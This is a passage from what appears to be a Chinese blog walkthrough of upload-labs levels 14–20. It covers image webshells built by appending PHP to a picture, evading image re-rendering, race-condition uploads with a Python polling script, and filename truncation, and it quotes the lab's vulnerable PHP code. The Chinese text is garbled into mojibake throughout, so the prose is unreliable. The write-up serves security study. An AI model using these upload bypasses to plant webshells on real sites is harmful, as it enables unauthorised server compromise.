$ext = image_type_to_extension($info[2]); // æ ¹æ®å¸¸é‡å¤§å°è¿”å›å›¾ç‰‡åç¼€å if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; getimagesizeå‡½æ•°çš„è¿”å›å€¼ï¼Œéšä¾¿æµ‹è¯•äº†ä¸‹ï¼Œä½¿ç”¨çš„æ˜¯pngæ ¼å¼å›¾ç‰‡ï¼Œè¿”å›äº†å…­ä¸ªå€¼ï¼Œä½¿ç”¨çš„æ•°ç»„ä¸­çš„ç¬¬äºŒä¸ªå€¼ï¼Œä»£è¡¨å›¾ç‰‡çš„ç±»å‹ PHPå¼€å‘æ‰‹å†Œæ‰€æœ‰çš„å›¾ç‰‡æ ¼å¼ä»£è¡¨çš„æ•°å­— æˆ‘ä½¿ç”¨ä¸Šä¸€å…³åˆ¶ä½œçš„å›¾ç‰‡é©¬ä¸è¡Œï¼Œå°±ç›´æ¥echoå‘½ä»¤å°†phpä»£ç å†™åœ¨ä¸€å¼ å›¾ç‰‡çš„æœ«å°¾ï¼Œåœ¨ä¸Šä¼ å‘ç°å¯ä»¥ï¼Œä¹Ÿèƒ½æ­£å¸¸è§£æï¼ˆè¿™åº”è¯¥æ˜¯æœ€ç®€å•çš„æ–¹æ³•ï¼‰ echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt;&gt; 2.png åœ¨ä½¿ç”¨æœ‰æ–‡ä»¶åŒ…å«æ¼æ´çš„é¡µé¢å‘ç°å¯ä»¥æ­£å¸¸è§£æå›¾ç‰‡ï¼Œè¿™ä¸€å…³æ„Ÿè§‰æ‰æ˜¯æ­£å®—çš„å›¾ç‰‡é©¬ï¼Œä¹‹å‰æ£€æµ‹æ–‡ä»¶å¤´çš„å¹¶ä¸æ˜¯å¾ˆæœ‰æ„Ÿè§‰ï¼Œè™½ç„¶ä¹Ÿæ¯”è¾ƒç®€å•ã€‚ ç„¶ååœ¨åšçš„æ—¶å€™å®¡æºç è¿˜æ˜¯è¦ä¸€è¾¹å®¡ä¸€è¾¹è‡ªå·±å»å°è¯•æ‰æ˜¯å­¦å¾—æœ€å¿«çš„ï¼Œè¿˜æœ‰æŸ¥php Manualã€‚ Less-15(PHPå†…ç½®å‡½æ•°ç»•è¿‡&lt;exif_imagetype&gt;)è¿™å…³çš„æ£€æµ‹å›¾ç‰‡å‡½æ•°åä¹Ÿå«isImageï¼Œä½†æ˜¯å†™æ³•å’Œä¸Šä¸€å…³çš„ä¸ä¸€æ ·äº†ï¼Œç”¨åˆ°äº†ä¸€ä¸ªå«åšexif_imagetypeçš„å‡½æ•°ï¼Œåœ¨phpæ‰‹å†Œä¸­æ˜¯è¿™æ ·ä»‹ç»çš„ 123456789101112131415161718function isImage($filename)&#123; //éœ€è¦å¼€å¯php_exifæ¨¡å— $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125; è¯»å–å›¾ç‰‡çš„åœ°ä¸€ä¸ªå­—èŠ‚ç„¶åæ£€æµ‹æ ‡å¿—ï¼Œè‡ªå·±å»æµ‹è¯•ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œå…¶å®å°±å’Œä¸Šä¸€å…³çš„getimagesizeå‡½æ•°çš„ä½œç”¨å·®ä¸å¤šï¼Œéƒ½æ˜¯è¿”å›ä»£è¡¨å›¾ç‰‡åç¼€çš„åç¼€ç¼–å·ï¼Œä¸‹é¢è´´php Manualçš„ä»‹ç»ã€‚ ä½¿ç”¨14å…³åˆ¶ä½œçš„å›¾ç‰‡é©¬å°±å¯ä»¥æˆåŠŸä¸Šä¼ ï¼Œç„¶åä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å»è§£æï¼Œemmmmmï¼Œæ„Ÿè§‰å­¦åˆ°çš„ä¸œè¥¿å¾ˆå°‘å”‰ã€‚å°±æ„Ÿè§‰å¦‚æœè¦è¿‡ç³»ç»Ÿå‡½æ•°çš„æ£€æµ‹é‚£å°±ç›´æ¥åœ¨åˆ«çš„å›¾ç‰‡åé¢è¿½åŠ phpä»£ç ç„¶åä½¿ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´å»è§£æåé¢å‡ å…³ä¸çŸ¥é“æ˜¯ä¸æ˜¯éƒ½èƒ½è¿™æ ·è¿‡ã€‚ Less-16(å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡)è¿™æ¬¡ç›´æ¥å°è¯•ä½¿ç”¨ä¹‹å‰çš„å›¾ç‰‡é©¬ï¼Œå‘ç°å¤±æ•ˆäº†ï¼Œçœ‹çœ‹æºç è¿™å…³å¯¹å›¾ç‰‡åšäº†ä»€ä¹ˆéªšæ“ä½œã€‚æºç æ˜¯ç›¸å½“é•¿å•Šã€‚é‡Œé¢ä¸è®¤è¯†çš„å‡½æ•°å†™åœ¨ä¸‹é¢ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.basename($filename); // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å $fileext= substr(strrchr($filename,&quot;.&quot;),1); //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagejpeg($im,$newimagepath); //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagepng($im,$newimagepath); //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;; @unlink($target_path); &#125;else&#123; //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagegif($im,$newimagepath); //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;; &#125; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;; &#125;&#125; basenameï¼šè·å–æœ€è·¯å¾„å­—ç¬¦ä¸²çš„åŸºæœ¬è·¯å¾„ï¼ˆä¹Ÿå°±æ˜¯æ–‡ä»¶åï¼‰ unlinkï¼šä¸Šä¼ æ–‡ä»¶ï¼Œç”¨äºä¿®å¤é¶åœºä¹‹å‰çš„æ¼æ´ imagecreatefromxxxï¼šé€šè¿‡æ–‡ä»¶è·¯å¾„æˆ–è€…urlç”Ÿæˆæ–°å›¾åƒ imagexxxï¼šä»è·¯å¾„æˆ–è€…urlç”Ÿæˆä¸€ä¸ªæ–°å›¾åƒ æ€»ä½“é€»è¾‘å°±æ˜¯åªèƒ½ä¸Šä¼ ä¸‰ç§æ ¼å¼çš„å›¾ç‰‡ï¼Œç»è¿‡phpå†…ç½®å‡½æ•°çš„äºŒæ¬¡æ¸²æŸ“ï¼Œå¦‚æœåŸæœ¬çš„å›¾ç‰‡å†…éƒ¨å­˜åœ¨phpåé—¨ä»£ç é‚£ä¹ˆç»è¿‡äºŒæ¬¡æ¸²æŸ“ä¹‹åçš„å›¾ç‰‡å°±æ²¡æœ‰åé—¨ä»£ç äº†ã€‚å…³äºäºŒæ¬¡æ¸²æŸ“çš„åŸç†ä¸æ˜¯å¾ˆæ‡‚ï¼Œç½‘ä¸Šä¹Ÿè¯´å¾—ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åŸå›¾å’Œç»è¿‡äºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡è¿›è¡Œæ¯”è¾ƒæ¥ä¿®æ”¹å›¾ç‰‡ï¼Œéœ€è¦çŸ¥é“ä¸€ç‚¹åŸºæœ¬çš„å›¾ç‰‡äºŒè¿›åˆ¶æ ¼å¼ï¼Œåœ¨ä¿®æ”¹æ—¶çŸ¥é“å“ªé‡Œéœ€è¦ä¿®æ”¹ã€‚è¿™é‡Œå‚è€ƒç½‘ä¸Šä¸€äº›å¸ˆå‚…çš„åšæ³•ã€‚ GIFå°†ç»è¿‡äºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡å’ŒåŸå›¾è¿›è¡Œæ¯”è¾ƒï¼Œçœ‹çœ‹é‚£äº›åœ°æ–¹æ²¡æœ‰ä¿®æ”¹ï¼Œç„¶ååœ¨æ²¡æœ‰ä¿®æ”¹çš„åœ°æ–¹è¿›è¡Œæ·»åŠ ï¼Œæ¯ä¸€å¼ gifå›¾ç‰‡ç›¸åŒå¤„ä¸ä¼šä¸€æ ·ã€‚ PNGéœ€è¦äº†è§£PNGå›¾ç‰‡çš„æ ¼å¼ï¼Œæ‰çŸ¥é“å¦‚ä½•ä¿®æ”¹æ‰èƒ½è®©å‡½æ•°æ£€æµ‹ä¸å‡ºæ¥ï¼Œéœ€è¦è®¡ç®—pngå›¾ç‰‡çš„crcå€¼ï¼Œå½“payloadå†™å…¥å›¾ç‰‡æ—¶ï¼Œcrcå€¼ä¼šéšç€payloadçš„é•¿åº¦æ”¹å˜ã€‚ JPGè¿™ä¸ªéœ€è¦ä½¿ç”¨ä¸€ä¸ªå›½å¤–å¤§ç¥çš„è„šæœ¬ï¼Œå°†payloadå†™å…¥.jpgæ ¼å¼çš„å›¾ç‰‡ä¸­ï¼Œé‡æ–°æ¸²æŸ“çš„å›¾ç‰‡å°±ä¼šå­˜åœ¨payloadï¼Œä¸”ç»è¿‡åç«¯çš„ä»£ç å†æ¬¡äºŒæ¬¡æ¸²æŸ“ä¹‹åpayloadä¹Ÿä¸ä¼šæ¶ˆå¤±ã€‚ Less-17(ä»£ç é€»è¾‘æ¼æ´ï¼Œæ¡ä»¶ç«äº‰)ä»£ç å®¡è®¡ï¼Œçœ‹æºç ï¼Œç¬¬ä¸€æ¬¡å®¡è®¡ä»£ç ï¼Œç„¶åçœ‹åˆ°äº†ä¸€ä¸ªæ–°åè¯ï¼ˆæ¡ä»¶ç«äº‰ï¼‰ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦æ¡ä»¶ç«äº‰ã€‚çœ‹äº†ç½‘ä¸Šçš„ç®€å•è®²è§£å¥½åƒæœ‰äº›æ˜ç™½äº†ã€‚ 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];//è·å–æ–‡ä»¶å $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];//è·å–ä¸Šä¼ å¤‡ä»½æ–‡ä»¶ $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);//è·å–æ–‡ä»¶åç¼€å $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name;//å¾—åˆ°ä¸Šä¼ è·¯å¾„ if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125;&#125; æºç é€»è¾‘å¦‚ä¸‹ï¼šé¦–å…ˆä¸Šä¼ æ–‡ä»¶ï¼Œåœ¨åˆ¤æ–­æ–‡ä»¶åç¼€åæ˜¯å¦åˆæ³•ï¼Œè¿™ä¸ªæ“ä½œæ¯”è¾ƒå…³é”®ï¼ˆç”¨ç½‘ä¸Šçš„è¯è¯´å°±æ˜¯å¼•ç‹¼å…¥å®¤ï¼‰ï¼Œå¦‚æœæ–‡ä»¶åç¼€ååˆæ³•åˆ™ä¿®æ”¹æ–‡ä»¶åç§°ï¼Œå¦‚æœä¸åˆæ³•åˆ™ä½¿ç”¨unlinkå‡½æ•°åˆ é™¤æ–‡ä»¶ã€‚ åœ¨çœ‹ç½‘ä¸Šçš„æ–‡ç« å°†æ¡ä»¶ç«äº‰æ—¶æ€»æ„Ÿè§‰å°‘äº†ç‚¹ä»€ä¹ˆï¼šphpè„šæœ¬æœ¬èº«æ˜¯å•çº¿ç¨‹ï¼Œå®ç°é«˜å¹¶å‘çš„æ˜¯æœåŠ¡å™¨ï¼Œè¿™æ ·çš„è¯åº”è¯¥æ¯è¿›è¡Œä¸€æ¬¡ä¸Šä¼ æ“ä½œæœåŠ¡å™¨ä¼šå¯ç”¨ä¸€ä¸ªå•ç‹¬çš„çº¿ç¨‹æ¥è¿›è¡Œç®¡ç†ï¼Œä¸ºä»€ä¹ˆä¼šé€ æˆæ¡ä»¶ç«äº‰å‘¢ï¼Ÿ åœ¨ä»”ç»†çœ‹äº†çœ‹ç½‘ä¸Šçš„æ–‡ç« ï¼Œä¸»è¦è¿‡ç¨‹å¦‚ä¸‹ï¼šä¸æ–­å‘æœåŠ¡å™¨å‘é€æ¶æ„æ•°æ®åŒ…ï¼Œä»£ç å…ˆå°†æ–‡ä»¶ä¸´æ—¶å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼Œç„¶åå†ç”±åç«¯ä»£ç åˆ¤æ–­ã€‚åç«¯åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ­£å¸¸éœ€è¦æ—¶é—´ï¼Œç„¶ååœ¨åç«¯åˆ¤æ–­æ“ä½œæ‰§è¡Œä¹‹å‰ä¸æ–­çš„è®¿é—®é‚£ä¸ªæ¶æ„æ–‡ä»¶ï¼Œå¦‚æœè®¿é—®æˆåŠŸï¼Œé‚£ä¹ˆæ¶æ„æ–‡ä»¶å°±æš‚æ—¶ä¸ä¼šè¢«åˆ é™¤ã€‚ ç®€å•æ¥è¯´åŸç†å°±æ˜¯ï¼šåœ¨æˆ‘ä»¬è¿›è¡Œæ–‡ä»¶è¯»å†™æ“ä½œæ—¶ï¼Œæ˜¯ä¸èƒ½åˆ é™¤è¯¥æ–‡ä»¶çš„ã€‚ é¦–å…ˆéœ€è¦ä½¿ç”¨bpæ¥è¿›è¡Œå¤šçº¿ç¨‹å‘åŒ…ï¼Œç„¶ååœ¨ä½¿ç”¨Pythonæ¥è¿›è¡Œç›‘æ§ã€‚è¿™é‡Œè¿˜å­¦åˆ°ä¸€ä¸ªä¸œè¥¿ï¼Œå…³äºdockerçš„ã€‚ 1234567891011# pythonç›‘æ§ä»£ç import requestsurl = &quot;http://172.17.0.2:80/upload/shell.php&quot;while True: html = requests.get(url) if html.status_code == 200: print(&quot;YES,you upload it!&quot;) else: print(&quot;NO&quot;) åˆšå¼€å§‹ä½¿ç”¨çš„ipåœ°å€å’Œç«¯å£æ˜¯0.0.0.0:88ï¼Œå½“æ—¶æ²¡æœ‰æƒ³é‚£ä¹ˆå¤šï¼Œä½†æ˜¯åé¢å‘ç°Pythonçš„requestsä¸€ç›´æŠ¥502é”™è¯¯ï¼Œæ‰¾äº†å¾ˆä¹…æ²¡æ‰¾åˆ°åŸå› ï¼Œçªç„¶æƒ³åˆ°0.0.0.0:88æ˜¯dockerä»å®¹å™¨ä¸­æ˜ å°„åˆ°æœ¬åœ°çš„ipåœ°å€ï¼Œå¦‚æœéœ€è¦è¯·æ±‚é‚£ä¹ˆipåœ°å€åº”è¯¥æ˜¯å®¹å™¨å†…çš„çœŸå®ipåœ°å€ï¼Œè¿™ä¸ªåœ°æ–¹å¡äº†å¾ˆä¹…ã€‚ ä½¿ç”¨å‘½ä»¤docker inspect upload-labsæŸ¥çœ‹å®¹å™¨è¯¦ç»†å†…å®¹ï¼Œé‡Œé¢è¯´æ˜äº†å®¹å™¨çš„ç½‘å…³åœ°å€å’Œç°åœ¨çš„ä½¿ç”¨çš„IPAddressï¼Œç„¶ååœ¨å»è¯·æ±‚ï¼Œç§’é€šã€‚ ç”¨è„šæœ¬è·‘èµ·æ¥åå°±æ˜¯ä¸€è€ƒéªŒæ‰‹é€Ÿçš„é—®é¢˜äº†ï¼Œä¸€ç›´F5åˆ·æ–°é¡µé¢ï¼Œå¯ä»¥çœ‹å¾…å¶å°”ä¼šå‡ºç°phpinfo()é¡µé¢ï¼Œèšå‰‘è¿ä¸Šå»ä¹Ÿæ˜¯æ–­æ–­ç»­ç»­çš„ã€‚ Less-18(æ¡ä»¶ç«äº‰ï¼Œå›¾ç‰‡é©¬)ä¹Ÿæ˜¯ä»£ç å®¡è®¡é¢˜ç›® 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;?php//index.php$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; require_once(&quot;./myupload.php&quot;); $imgFileName =time();//åˆ©ç”¨æ—¶é—´æˆ³è¿›è¡Œæ–‡ä»¶å‘½å $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = &#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;; break; case -1: $msg = &#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;; break; case -2: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;; break; case -3: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;; break; case -4: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;; break; case -5: $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;; break; case -6: $msg = &#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;; break; default: $msg = &#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;; break; &#125;&#125;//myupload.phpclass MyUpload&#123; var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; ); /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); //check file upload path if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension();//check upload file extension if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize();//check upload file size if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); &#125;&#125;;?&gt; æºç å®šä¹‰äº†uploadç±»ï¼Œä¾æ¬¡è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œæ£€æµ‹æ–‡ä»¶çš„é¡ºåºä¸ºï¼š æ£€æµ‹ç›®å½• -&gt; æ£€æµ‹æ–‡ä»¶åç¼€å -&gt; æ£€æµ‹æ–‡ä»¶å¤§å° -&gt; æ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ -&gt; å°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ -&gt; é‡å‘½åæ–‡ä»¶ æ‰€ä»¥è¿™å…³å¯ä»¥ä½¿ç”¨å›¾ç‰‡é©¬åŠ æ¡ä»¶ç«äº‰çš„æ–¹å¼å»Passï¼Œé¦–å…ˆæ–‡ä»¶åç¼€åéœ€è¦ç¬¦åˆè¦æ±‚ï¼Œæ‰èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œè¿™ä¸ªè¿‡ç¨‹åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥æ‹¿åˆ°ç½‘ç«™shell(æ‰‹é€Ÿä¸€å®šè¦å¿«) ä½¿ç”¨åœºæ™¯ä¸è§¦å‘æ¡ä»¶ï¼š æœåŠ¡å™¨èƒ½å¤šåç¼€åè§£æï¼ˆæˆ–è€…å…¶ä»–è§£ææ¼æ´ï¼‰ï¼Œè¿™ä¸ªå®åœ¨æœåŠ¡å™¨å±‚é¢ å¦‚æœæœåŠ¡å™¨å±‚é¢ä¸Šæ²¡æœ‰è§£ææ¼æ´ï¼Œé‚£ä¹ˆå°±éœ€è¦ä»£ç å±‚é¢æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆä½†æ˜¯å¦‚æœæœ‰æ–‡ä»¶åŒ…å«æ¼æ´å°±ä¸éœ€è¦æ¡ä»¶ç«äº‰äº†ï¼‰ ä»£ç é€»è¾‘ä¸ºå…ˆä¸Šä¼ ï¼Œåœ¨é‡å‘½å æ€»ç»“ï¼šPass-17ä¸Pass-18éƒ½æ˜¯ä½¿ç”¨æ¡ä»¶ç«äº‰ï¼Œå…¶å®æ¡ä»¶ç«äº‰æœ¬èº«ä¸æ˜¯æ¼æ´ï¼Œåªæ˜¯åœ¨åç«¯ä»£ç å±‚é¢ä¸Šå‡ºç°äº†é€»è¾‘æ¼æ´ï¼ˆå…ˆä¸Šä¼ ååˆ¤æ–­åœ¨æ”¹åï¼Œæ‰€è°“çš„å¼•ç‹¼å…¥å®¤ï¼‰ï¼Œåœ¨å‘ç°å­˜åœ¨å…ˆä¸Šä¼ ååˆ¤æ–­çš„ä»£ç éƒ½å¯æµ‹è¯•ä½¿ç”¨æ¡ä»¶ç«äº‰æ¥get webshell Less-19(ä¸Šä¼ æ–‡ä»¶åå¯æ§ï¼Œå¤šæ–¹æ³•ç»•è¿‡)è¿™ä¸€å…³ä¸Šä¼ æ–‡ä»¶éœ€è¦è‡ªå®šä¹‰æ–‡ä»¶åï¼Œæ–‡ä»¶åå‚æ•°å¯æ§ï¼Œé‚£ä¹ˆæ–¹å¼å°±å¾ˆå¤šäº†ã€‚åœ¨windowså’ŒLinuxä¸Šæœ‰ä¸åŒçš„æ–‡ä»¶åç§°ç®¡ç†æœºåˆ¶ åç¼€ï¼Œç©ºæ ¼ï¼Œå¤šç‚¹ç©ºæ ¼ï¼Œ%00æˆªæ–­ç»•è¿‡éƒ½å¯ä»¥ï¼Œåªéœ€è¦åœ¨æŠ“åŒ…çš„æ—¶å€™ä¿®æ”¹å°±OKã€‚ Less-20(CTF)123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //æ£€æŸ¥MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;; &#125;else&#123; //æ£€æŸ¥æ–‡ä»¶å $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; //å¦‚æœ$fileä¸æ˜¯æ•°ç»„å°±è¿›è¡Œåˆ†å‰² $file = explode(&#x27;.&#x27;, strtolower($file));//å°†æ–‡ä»¶åå…¨å°å†™å¹¶ä¸”ä½¿ç”¨.åˆ†å‰² &#125; $ext = end($file);//å¾—åˆ°æ–‡ä»¶åç¼€å $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];//è¿‡æ»¤æ‰å¤šä½™çš„.å·ï¼Œé˜²æ­¢æœåŠ¡å™¨å¤šé‡è§£æ $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = 